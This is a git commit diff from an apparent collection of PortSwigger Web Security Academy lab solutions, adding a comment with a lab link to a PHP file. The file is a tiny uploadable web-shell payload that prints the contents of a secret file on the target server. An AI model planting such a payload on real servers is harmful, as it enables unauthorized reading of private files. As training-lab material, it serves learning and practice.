4147fb85e469c595a49086660d8cda278e077ee2
Rogue Blue <rogueblueprint@protonmail.com>
2023-05-22 15:44:13 -0700

    Added comment with link to lab

--- Port-Swigger-Lab-Scripts/File-Upload-Vulnerabilities/rce-via-web-shell.php
+++ Port-Swigger-Lab-Scripts/File-Upload-Vulnerabilities/rce-via-web-shell.php
@@ -1,3 +1,5 @@
 <?php
+    // PHP command to solve the following lab:
+    // https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
     echo file_get_contents('/home/carlos/secret');
 ?>
